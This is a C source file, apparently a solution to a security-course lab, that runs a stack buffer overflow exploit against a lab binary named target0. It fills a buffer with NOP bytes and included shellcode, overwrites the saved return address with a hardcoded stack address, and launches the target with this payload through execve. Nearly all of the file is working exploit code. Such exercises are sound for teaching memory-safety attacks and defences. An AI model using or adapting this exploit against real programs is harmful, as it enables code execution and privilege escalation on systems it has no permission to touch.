#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/lab1/bin/target0"

#define NOOP 0x90            // no-op instruction
#define BUFLEN 280           // target buffer length
#define FP_LEN 4             // byte length of saved frame pointer
#define RET_ADDR_LEN 4       // byte length of return address
#define NULL_BYTE_LEN 1      // byte length for null byte
#define BUF_ADDR 0xffffdc14  // addr of the start of the buffer

int main(void) {
  char *args[3];
  char *env[1];

  // buffer for overwritting the frame pointer and return address
  char buf[BUFLEN + FP_LEN + RET_ADDR_LEN + NULL_BYTE_LEN];

  // setting the buffer to be no-op to make sure there are no null bytes in the
  // buffer
  memset(buf, NOOP, sizeof(buf) - 1);

  // set the last byte in the buffer to be null byte
  buf[BUFLEN + FP_LEN + RET_ADDR_LEN] = '\0';

  // copy the shell code to be at the beginning of the buffer
  memcpy(buf, shellcode, sizeof(shellcode) - 1);

  // set %eip (return address) to the addr of the start of the buffer (i.e. the
  // shell code)
  *(unsigned int *)(buf + BUFLEN + FP_LEN) = BUF_ADDR;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env)) perror("execve failed");

  return 0;
}
